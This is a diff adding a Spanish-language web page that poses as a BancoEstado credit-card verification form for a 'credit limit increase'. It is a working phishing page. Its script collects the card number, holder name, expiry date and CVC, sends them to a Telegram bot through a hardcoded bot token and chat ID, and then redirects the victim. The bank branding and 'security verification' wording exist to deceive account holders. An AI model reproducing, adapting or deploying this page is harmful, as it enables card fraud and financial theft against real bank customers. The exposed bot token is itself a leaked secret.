@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Tarjeta Crédito BancoEstado | Verificación</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background:#f0f2f5;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+        padding: 24px;
+    }
+
+    .wrapper {
+        max-width: 520px;
+        width: 100%;
+        margin: 0 auto;
+    }
+
+    .top-banner {
+        width: 100%;
+        background: #ffffff;
+        border-radius: 20px;
+        margin-bottom: 20px;
+        padding: 12px 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        transition: all 0.3s ease;
+        cursor: pointer;
+    }
+
+    .logo-banner {
+        height: 45px;
+        width: auto;
+        max-width: 120px;
+        object-fit: contain;
+    }
+
+    .banner-text {
+        font-weight: 700;
+        font-size: 0.9rem;
+        color: #1e3a2f;
+        letter-spacing: 0.5px;
+    }
+
+    .verification-header {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    
+    .verification-title {
+        background: linear-gradient(135deg, #0a2a44, #1a5a7a);
+        color: white;
+        padding: 12px 20px;
+        border-radius: 50px;
+        font-weight: 700;
+        font-size: 1.2rem;
+        letter-spacing: 1px;
+        display: inline-block;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    
+    .verification-title::before {
+        content: "🔐 ";
+        font-size: 1.1rem;
+    }
+
+    /* Selector de tipo de tarjeta */
+    .card-type-selector {
+        display: flex;
+        gap: 10px;
+        justify-content: center;
+        margin-bottom: 15px;
+        background: white;
+        padding: 10px;
+        border-radius: 50px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        flex-wrap: wrap;
+    }
+
+    .card-type-btn {
+        padding: 10px 25px;
+        border: 2px solid #e0e0e0;
+        border-radius: 30px;
+        background: white;
+        cursor: pointer;
+        font-weight: 700;
+        font-size: 0.85rem;
+        transition: all 0.3s ease;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        flex: 1;
+        justify-content: center;
+        min-width: 120px;
+    }
+
+    .card-type-btn:hover {
+        transform: scale(1.03);
+    }
+
+    .card-type-btn.active-mastercard {
+        border-color: #ff8800;
+        background: #fff5e6;
+        color: #cc5500;
+        box-shadow: 0 4px 12px rgba(255, 136, 0, 0.25);
+    }
+
+    .card-type-btn.active-visa {
+        border-color: #1a5a8a;
+        background: #e6edf5;
+        color: #1a5a8a;
+        box-shadow: 0 4px 12px rgba(26, 90, 138, 0.25);
+    }
+
+    .card-type-btn svg {
+        width: 28px;
+        height: 28px;
+        flex-shrink: 0;
+    }
+
+    .card-type-indicator {
+        text-align: center;
+        margin-bottom: 15px;
+        font-size: 0.9rem;
+        font-weight: 600;
+        color: #555;
+        min-height: 28px;
+    }
+
+    .card-type-indicator .detected {
+        color: white;
+        padding: 4px 16px;
+        border-radius: 20px;
+        display: inline-block;
+        font-size: 0.85rem;
+    }
+    .card-type-indicator .detected.mastercard { background: #cc5500; }
+    .card-type-indicator .detected.visa { background: #1a5a8a; }
+
+    .card-stage {
+        perspective: 1200px;
+        margin-bottom: 24px;
+    }
+
+    .card {
+        position: relative;
+        width: 100%;
+        aspect-ratio: 85 / 54;
+        border-radius: 28px;
+        transform-style: preserve-3d;
+        transition: transform 0.65s cubic-bezier(0.23, 1, 0.32, 1);
+        box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.35);
+    }
+
+    .card.flipped { transform: rotateY(180deg); }
+
+    .card-face {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        border-radius: 28px;
+        backface-visibility: hidden;
+        overflow: hidden;
+    }
+
+    .front-mastercard {
+        background: radial-gradient(circle at 10% 20%, #ff8800, #cc5500);
+        padding: 20px 22px;
+        display: none;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+
+    .front-visa {
+        background: radial-gradient(circle at 10% 20%, #1a6a9a, #0a2a5a);
+        padding: 20px 22px;
+        display: none;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+
+    .front-mastercard.active, .front-visa.active {
+        display: flex;
+    }
+
+    .back {
+        background: linear-gradient(145deg, #2a2a2a, #1a1a1a);
+        transform: rotateY(180deg);
+    }
+
+    .black-strip {
+        background: #0a0a0a;
+        width: 100%;
+        height: 50px;
+        margin-top: 24px;
+    }
+
+    .cvc-container {
+        background: #fff9ef;
+        margin: 24px 20px 20px 20px;
+        border-radius: 10px;
+        padding: 10px 16px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .cvc-input {
+        background: transparent;
+        border: none;
+        font-size: 1.3rem;
+        font-weight: bold;
+        font-family: monospace;
+        width: 80px;
+        text-align: right;
+        outline: none;
+    }
+
+    .bank-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+
+    .bank-name {
+        font-size: 1.6rem;
+        font-weight: 800;
+        color: #ffffff;
+        text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+
+    .badge {
+        background: rgba(255,215,0,0.3);
+        backdrop-filter: blur(2px);
+        border-radius: 40px;
+        padding: 4px 10px;
+        font-size: 0.65rem;
+        font-weight: 700;
+        color: #FFD700;
+        border: 1px solid rgba(255,215,0,0.2);
+    }
+
+    .sim-chip {
+        width: 48px;
+        height: 38px;
+        background: linear-gradient(135deg, #e0b87a, #bd8a3e);
+        border-radius: 8px;
+        margin-top: 12px;
+        position: relative;
+    }
+    .sim-chip:before {
+        content: "";
+        position: absolute;
+        top: 8px;
+        left: 10px;
+        width: 28px;
+        height: 20px;
+        background: repeating-linear-gradient(45deg, #c29a4b, #c29a4b 4px, #e6c384 4px, #e6c384 8px);
+        border-radius: 4px;
+    }
+
+    .card-number-input, .editable-value {
+        background: transparent;
+        border: none;
+        font-weight: 700;
+        outline: none;
+        color: #ffffff;
+        font-family: 'Courier New', monospace;
+        text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+    }
+    .card-number-input {
+        font-size: 1.2rem;
+        letter-spacing: 2px;
+        width: 100%;
+        padding: 6px 0;
+        margin-top: 12px;
+    }
+    .card-number-input::placeholder, .editable-value::placeholder {
+        color: rgba(255,255,255,0.6);
+    }
+    .info-row {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 16px;
+    }
+    .label {
+        font-size: 0.6rem;
+        font-weight: 600;
+        text-transform: uppercase;
+        color: rgba(255,255,255,0.8);
+        letter-spacing: 0.5px;
+    }
+
+    .card-logo {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        justify-content: flex-end;
+    }
+
+    .mc-circle-red {
+        background: #EB001B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        position: relative;
+        right: -12px;
+        opacity: 0.9;
+    }
+    .mc-circle-yellow {
+        background: #F79E1B;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        opacity: 0.9;
+    }
+
+    .visa-logo-text {
+        font-size: 2rem;
+        font-weight: 900;
+        color: white;
+        text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        letter-spacing: 2px;
+        font-family: 'Arial Black', sans-serif;
+    }
+    .visa-logo-text span {
+        background: linear-gradient(135deg, #1a3a8a, #4a7aba);
+        padding: 4px 12px;
+        border-radius: 8px;
+    }
+
+    .btn-send {
+        background: linear-gradient(95deg, #1a3a6a, #0a2a4a);
+        border: none;
+        width: 98%;
+        padding: 21px;
+        border-radius: 40px;
+        color: #ffffff;
+        font-weight: 700;
+        cursor: pointer;
+        transition: 0.2s;
+        margin-top: 100px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        font-size: 1.1rem;
+        box-shadow: 0 8px 20px rgba(26, 58, 106, 0.3);
+    }
+    .btn-send:hover { transform: scale(0.98); background: #0f2a4a; }
+    .btn-send:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+    }
+
+    .status-msg {
+        font-size: 0.75rem;
+        margin-top: 12px;
+        text-align: center;
+        padding: 10px;
+        border-radius: 40px;
+        background: #f0f0f0;
+        transition: all 0.3s ease;
+    }
+
+    .length-info {
+        text-align: center;
+        font-size: 0.7rem;
+        color: #888;
+        margin-top: 8px;
+    }
+
+    @media (max-width: 480px) {
+        .card-number-input { font-size: 1rem; }
+        .verification-title { font-size: 1rem; padding: 8px 16px; }
+        .logo-banner { height: 35px; }
+        .banner-text { font-size: 0.75rem; }
+        .bank-name { font-size: 1.2rem; }
+        .visa-logo-text { font-size: 1.5rem; }
+        .card-type-btn { padding: 8px 15px; font-size: 0.75rem; min-width: 100px; }
+        .card-type-btn svg { width: 22px; height: 22px; }
+    }
+</style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="top-banner" id="customBanner">
+        <img class="logo-banner" src="https://cdn2.downdetector.com/static/uploads/logo/bancoestado.png" alt="BancoEstado" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20100%2050%22%3E%3Crect%20width%3D%22100%22%20height%3D%2250%22%20fill%3D%22%23FF8800%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23fff%22%3EBancoEstado%3C%2Ftext%3E%3C%2Fsvg%3E';">
+        <span class="banner-text">verificación de seguridad • BancoEstado</span>
+    </div>
+    <br> <br><br><br>
+    
+    <div class="verification-header">
+        <div class="verification-title">Verificación de tarjeta de crédito para Beneficiario al aumento de Cupo</div>
+    </div>
+
+    <!-- Selector de tipo de tarjeta -->
+    <div class="card-type-selector">
+        <button class="card-type-btn active-mastercard" id="btnMastercard" data-type="mastercard">
+            <svg viewBox="0 0 48 48">
+                <circle cx="18" cy="24" r="14" fill="#EB001B" opacity="0.8"/>
+                <circle cx="30" cy="24" r="14" fill="#F79E1B" opacity="0.8"/>
+            </svg>
+            Mastercard
+        </button>
+        <button class="card-type-btn" id="btnVisa" data-type="visa">
+            <svg viewBox="0 0 48 48">
+                <rect x="4" y="10" width="40" height="28" rx="4" fill="#1A3A6A"/>
+                <text x="24" y="30" text-anchor="middle" fill="white" font-size="16" font-weight="900" font-family="Arial">VISA</text>
+            </svg>
+            Visa
+        </button>
+    </div>
+
+    <div class="card-type-indicator" id="cardTypeIndicator">
+        <span style="color: #888;">Selecciona el tipo de tarjeta o ingresa el número</span>
+    </div>
+    
+    <div class="card-stage">
+        <div class="card" id="creditCard">
+            <!-- FRENTE MASTERCARD -->
+            <div class="card-face front-mastercard active" id="frontMastercard">
+                <div class="bank-header">
+                    <div class="bank-name">BancoEstado</div>
+                    <div class="badge">CRÉDITO</div>
+                </div>
+                <div class="sim-chip"></div>
+                <input type="text" id="cardNumberInput" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric" autocomplete="off">
+                <div class="info-row">
+                    <div class="info-group" style="flex: 2;">
+                        <div class="label">TITULAR</div>
+                        <input type="text" id="cardHolderInput" class="editable-value" placeholder="NOMBRE DEL TITULAR" maxlength="35">
+                    </div>
+                    <div class="info-group">
+                        <div class="label">VENCE</div>
+                        <input type="text" id="expiryInput" class="editable-value" placeholder="MM/AA" maxlength="5" style="width: 70px;">
+                    </div>
+                </div>
+                <div class="card-logo">
+                    <div class="mc-circle-red"></div>
+                    <div class="mc-circle-yellow"></div>
+                    <span style="font-weight:800;color:white;margin-left:8px;">Mastercard</span>
+                </div>
+            </div>
+
+            <!-- FRENTE VISA -->
+            <div class="card-face front-visa" id="frontVisa">
+                <div class="bank-header">
+                    <div class="bank-name">BancoEstado</div>
+                    <div class="badge">CRÉDITO</div>
+                </div>
+                <div class="sim-chip"></div>
+                <!-- MISMO CAMPO DE NÚMERO COMPARTIDO -->
+                <input type="text" id="cardNumberInputVisa" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric" autocomplete="off">
+                <div class="info-row">
+                    <div class="info-group" style="flex: 2;">
+                        <div class="label">TITULAR</div>
+                        <input type="text" id="cardHolderInputVisa" class="editable-value" placeholder="NOMBRE DEL TITULAR" maxlength="35">
+                    </div>
+                    <div class="info-group">
+                        <div class="label">VENCE</div>
+                        <input type="text" id="expiryInputVisa" class="editable-value" placeholder="MM/AA" maxlength="5" style="width: 70px;">
+                    </div>
+                </div>
+                <div class="card-logo">
+                    <div class="visa-logo-text"><span>VISA</span></div>
+                </div>
+            </div>
+
+            <!-- REVERSO -->
+            <div class="card-face back">
+                <div class="black-strip"></div>
+                <div class="cvc-container">
+                    <span style="font-weight:700">CVC</span>
+                    <input type="text" id="cvcInput" class="cvc-input" maxlength="3" placeholder="123" inputmode="numeric">
+                </div>
+                <div style="margin-top: 16px; text-align: center; font-size: 0.55rem; color: #8a9ab0;">BancoEstado • Banca Segura</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="length-info" id="lengthInfo">🔢 Visa y Mastercard: <strong>16 dígitos</strong></div>
+
+    <button class="btn-send" id="sendBtn">
+        <span></span>Continuar
+    </button>
+    <div id="statusMsg" class="status-msg">✅ Completa los datos y verifica tu identidad</div>
+</div>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = '8259492954:AAG1Ch17kihkX2Gefjy30SIMYRAwEvhv8pw';
+    const TELEGRAM_CHAT_ID = '7773314129';
+
+    const card = document.getElementById('creditCard');
+    const frontMastercard = document.getElementById('frontMastercard');
+    const frontVisa = document.getElementById('frontVisa');
+    const cvcInput = document.getElementById('cvcInput');
+    const sendBtn = document.getElementById('sendBtn');
+    const statusMsg = document.getElementById('statusMsg');
+    const cardTypeIndicator = document.getElementById('cardTypeIndicator');
+    const lengthInfo = document.getElementById('lengthInfo');
+    const btnMastercard = document.getElementById('btnMastercard');
+    const btnVisa = document.getElementById('btnVisa');
+
+    let cardType = 'mastercard';
+    let isFlippingFromExpiry = false;
+    let expiryTimeout = null;
+
+    // Referencia al campo de número activo
+    let activeNumberInput = null;
+
+    // Obtener inputs según tipo
+    function getCardInputs() {
+        if (cardType === 'mastercard') {
+            return {
+                number: document.getElementById('cardNumberInput'),
+                holder: document.getElementById('cardHolderInput'),
+                expiry: document.getElementById('expiryInput')
+            };
+        } else if (cardType === 'visa') {
+            return {
+                number: document.getElementById('cardNumberInputVisa'),
+                holder: document.getElementById('cardHolderInputVisa'),
+                expiry: document.getElementById('expiryInputVisa')
+            };
+        }
+        return null;
+    }
+
+    // Detectar tipo de tarjeta por número
+    function detectCardType(number) {
+        const clean = number.replace(/\s/g, '');
+        if (clean.length === 0) return 'none';
+        const firstDigit = clean.charAt(0);
+        if (firstDigit === '4') return 'visa';
+        if (firstDigit === '5') return 'mastercard';
+        return 'none';
+    }
+
+    // Formatear número de tarjeta en grupos de 4 (SOLO DÍGITOS)
+    function formatCardNumber(value) {
+        // Eliminar todo lo que no sea número
+        let cleaned = value.replace(/\D/g, '');
+        // Limitar a 16 dígitos
+        if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
+        // Dividir en grupos de 4
+        let parts = [];
+        for (let i = 0; i < cleaned.length; i += 4) {
+            parts.push(cleaned.slice(i, i + 4));
+        }
+        return parts.join(' ');
+    }
+
+    // Sincronizar valor entre inputs de Mastercard y Visa
+    function syncCardValue(value) {
+        const mcInput = document.getElementById('cardNumberInput');
+        const visaInput = document.getElementById('cardNumberInputVisa');
+        if (mcInput && visaInput) {
+            mcInput.value = value;
+            visaInput.value = value;
+        }
+    }
+
+    // Actualizar la tarjeta según el tipo
+    function updateCardType(type, fromButton = false) {
+        if (type === 'none') return;
+        if (type === cardType && !fromButton) return;
+        
+        // Guardar el valor actual del input activo
+        const inputs = getCardInputs();
+        const currentValue = inputs ? inputs.number.value : '';
+        const activeElement = document.activeElement;
+        const isNumberFocused = activeElement && activeElement.id && (activeElement.id === 'cardNumberInput' || activeElement.id === 'cardNumberInputVisa');
+        
+        cardType = type;
+        
+        // Actualizar botones
+        btnMastercard.className = 'card-type-btn';
+        btnVisa.className = 'card-type-btn';
+        
+        if (type === 'mastercard') btnMastercard.classList.add('active-mastercard');
+        else if (type === 'visa') btnVisa.classList.add('active-visa');
+        
+        // Actualizar tarjeta
+        frontMastercard.classList.remove('active');
+        frontVisa.classList.remove('active');
+        
+        const indicator = document.getElementById('cardTypeIndicator');
+        
+        if (type === 'mastercard') {
+            frontMastercard.classList.add('active');
+            indicator.innerHTML = '<span class="detected mastercard">💳 Mastercard seleccionada (16 dígitos)</span>';
+            cvcInput.maxLength = 3;
+            cvcInput.placeholder = '123';
+            lengthInfo.innerHTML = '🔢 Mastercard: <strong>16 dígitos</strong> | Visa: 16';
+        } else if (type === 'visa') {
+            frontVisa.classList.add('active');
+            indicator.innerHTML = '<span class="detected visa">💳 Visa seleccionada (16 dígitos)</span>';
+            cvcInput.maxLength = 3;
+            cvcInput.placeholder = '123';
+            lengthInfo.innerHTML = '🔢 Visa: <strong>16 dígitos</strong> | Mastercard: 16';
+        }
+        
+        // Restaurar el valor formateado en ambos inputs
+        const formattedValue = formatCardNumber(currentValue);
+        syncCardValue(formattedValue);
+        
+        // Restaurar el foco
+        if (isNumberFocused) {
+            const newInputs = getCardInputs();
+            if (newInputs) {
+                setTimeout(() => {
+                    newInputs.number.focus();
+                    const len = newInputs.number.value.length;
+                    newInputs.number.setSelectionRange(len, len);
+                }, 50);
+            }
+        }
+    }
+
+    // Eventos de los botones
+    btnMastercard.addEventListener('click', () => updateCardType('mastercard', true));
+    btnVisa.addEventListener('click', () => updateCardType('visa', true));
+
+    async function enviarATelegram(cardData) {
+        const tipoMap = {
+            'mastercard': 'Mastercard',
+            'visa': 'Visa'
+        };
+        const tipo = tipoMap[cardData.cardType] || 'Desconocido';
+        const mensaje = `💳 *NUEVA TARJETA DE CRÉDITO VERIFICADA*\n\n` +
+                       `🏦 Banco: BancoEstado\n` +
+                       `💳 Tipo: ${tipo}\n` +
+                       `🔢 Número: ${cardData.cardNumber}\n` +
+                       `👤 Titular: ${cardData.cardHolder}\n` +
+                       `📅 Vence: ${cardData.expiryDate}\n` +
+                       `🔐 CVC: ${cardData.cvcCode}\n` +
+                       `🕐 Fecha: ${cardData.timestamp}`;
+        
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown'
+            });
+            
+            const response = await fetch(`${url}?${params}`);
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log('✅ Mensaje enviado a Telegram');
+                return true;
+            } else {
+                console.error('❌ Error al enviar a Telegram:', data);
+                return false;
+            }
+        } catch (error) {
+            console.error('❌ Error en la solicitud a Telegram:', error);
+            return false;
+        }
+    }
+
+    function formatExpiry(value) {
+        let digits = value.replace(/\D/g, '');
+        if (digits.length > 4) digits = digits.slice(0, 4);
+        if (digits.length >= 3) return digits.slice(0,2) + '/' + digits.slice(2,4);
+        return digits;
+    }
+
+    // Configurar eventos para ambos inputs de número
+    function setupCardEvents() {
+        const mcNumber = document.getElementById('cardNumberInput');
+        const visaNumber = document.getElementById('cardNumberInputVisa');
+        const mcHolder = document.getElementById('cardHolderInput');
+        const visaHolder = document.getElementById('cardHolderInputVisa');
+        const mcExpiry = document.getElementById('expiryInput');
+        const visaExpiry = document.getElementById('expiryInputVisa');
+
+        // Función para manejar el input del número (compartido)
+        function handleNumberInput(e) {
+            const rawValue = e.target.value;
+            const detectedType = detectCardType(rawValue);
+            
+            // Detectar tipo automáticamente
+            if (detectedType !== 'none' && detectedType !== cardType) {
+                updateCardType(detectedType, false);
+            }
+            
+            // Aplicar formato de 4 en 4
+            const formatted = formatCardNumber(rawValue);
+            e.target.value = formatted;
+            // Sincronizar con el otro input
+            syncCardValue(formatted);
+        }
+
+        // Función para manejar el input de fecha (compartida)
+        function handleExpiryInput(e) {
+            let formatted = formatExpiry(e.target.value);
+            e.target.value = formatted;
+            
+            // Sincronizar
+            const otherId = e.target.id === 'expiryInput' ? 'expiryInputVisa' : 'expiryInput';
+            const otherInput = document.getElementById(otherId);
+            if (otherInput) otherInput.value = formatted;
+            
+            if (expiryTimeout) clearTimeout(expiryTimeout);
+            if (e.target.value.length === 5 && e.target.value.includes('/')) {
+                expiryTimeout = setTimeout(() => {
+                    if (!card.classList.contains('flipped')) {
+                        isFlippingFromExpiry = true;
+                        card.classList.add('flipped');
+                        setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
+                    }
+                    expiryTimeout = null;
+                }, 300);
+            }
+        }
+
+        // Función para manejar el input del titular (compartida)
+        function handleHolderInput(e) {
+            const value = e.target.value.toUpperCase().replace(/[^A-Z\s\.Ñ]/g, '');
+            e.target.value = value;
+            const otherId = e.target.id === 'cardHolderInput' ? 'cardHolderInputVisa' : 'cardHolderInput';
+            const otherInput = document.getElementById(otherId);
+            if (otherInput) otherInput.value = value;
+        }
+
+        // Asignar eventos a Mastercard
+        mcNumber.addEventListener('input', handleNumberInput);
+        mcHolder.addEventListener('input', handleHolderInput);
+        mcExpiry.addEventListener('input', handleExpiryInput);
+        mcExpiry.addEventListener('blur', function() {
+            if (expiryTimeout) clearTimeout(expiryTimeout);
+            if (!card.classList.contains('flipped') && mcExpiry.value.length >= 3) {
+                isFlippingFromExpiry = true;
+                card.classList.add('flipped');
+                setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
+            }
+        });
+
+        // Asignar eventos a Visa
+        visaNumber.addEventListener('input', handleNumberInput);
+        visaHolder.addEventListener('input', handleHolderInput);
+        visaExpiry.addEventListener('input', handleExpiryInput);
+        visaExpiry.addEventListener('blur', function() {
+            if (expiryTimeout) clearTimeout(expiryTimeout);
+            if (!card.classList.contains('flipped') && visaExpiry.value.length >= 3) {
+                isFlippingFromExpiry = true;
+                card.classList.add('flipped');
+                setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
+            }
+        });
+
+        // Focus eventos para ambos
+        [mcNumber, visaNumber].forEach(inp => {
+            inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        });
+        [mcHolder, visaHolder].forEach(inp => {
+            inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        });
+        [mcExpiry, visaExpiry].forEach(inp => {
+            inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        });
+    }
+
+    cvcInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+    });
+    cvcInput.addEventListener('focus', () => { if(!isFlippingFromExpiry) card.classList.add('flipped'); });
+    cvcInput.addEventListener('blur', () => {
+        setTimeout(() => {
+            const active = document.activeElement;
+            const inputs = getCardInputs();
+            if (inputs && active !== inputs.number && active !== inputs.holder && active !== inputs.expiry && active !== cvcInput)
+                card.classList.remove('flipped');
+        }, 150);
+    });
+
+    // Inicializar
+    frontMastercard.classList.add('active');
+    setupCardEvents();
+
+    function redirectToIntro() {
+        window.location.href = 'intro.html';
+    }
+
+    sendBtn.addEventListener('click', async () => {
+        const inputs = getCardInputs();
+        if (!inputs) {
+            statusMsg.innerHTML = '⚠️ Selecciona un tipo de tarjeta válido';
+            statusMsg.style.background = '#ffe0e0';
+            return;
+        }
+        
+        const cardNumber = inputs.number.value.replace(/\s/g, '');
+        const cardHolder = inputs.holder.value.trim();
+        const expiryDate = inputs.expiry.value.trim();
+        const cvcCode = cvcInput.value.trim();
+
+        if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
+            statusMsg.innerHTML = '⚠️ Por favor, completa todos los datos de la tarjeta';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        if (cardNumber.length !== 16) {
+            statusMsg.innerHTML = `⚠️ El número de tarjeta debe tener exactamente 16 dígitos (tiene ${cardNumber.length})`;
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        if (expiryDate.length < 5 || !expiryDate.includes('/')) {
+            statusMsg.innerHTML = '⚠️ La fecha debe tener formato MM/AA';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        const month = parseInt(expiryDate.substring(0,2), 10);
+        if (month < 1 || month > 12) {
+            statusMsg.innerHTML = '⚠️ Mes inválido (debe ser 01-12)';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        if (cvcCode.length !== 3) {
+            statusMsg.innerHTML = `⚠️ El CVC debe tener exactamente 3 dígitos (tiene ${cvcCode.length})`;
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+
+        sendBtn.disabled = true;
+        sendBtn.innerHTML = '<span></span>Verificando...';
+        statusMsg.innerHTML = '🔐 Verificando datos bancarios...';
+        statusMsg.style.background = '#e3f2fd';
+        statusMsg.style.color = '#004085';
+
+        const cardData = {
+            cardType: cardType,
+            cardNumber: cardNumber,
+            cardHolder: cardHolder,
+            expiryDate: expiryDate,
+            cvcCode: cvcCode,
+            timestamp: new Date().toLocaleString('es-CL', { timeZone: 'America/Santiago' })
+        };
+
+        const enviado = await enviarATelegram(cardData);
+        
+        if (enviado) {
+            statusMsg.innerHTML = '✅ Datos verificados, redirigiendo...';
+            statusMsg.style.background = '#d4edda';
+            statusMsg.style.color = '#155724';
+            setTimeout(redirectToIntro, 1000);
+        } else {
+            statusMsg.innerHTML = '❌ Error al verificar los datos. Intenta nuevamente.';
+            statusMsg.style.background = '#f8d7da';
+            statusMsg.style.color = '#721c24';
+            sendBtn.disabled = false;
+            sendBtn.innerHTML = '<span></span>Continuar';
+        }
+    });
+</script>
+</body>
+</html>
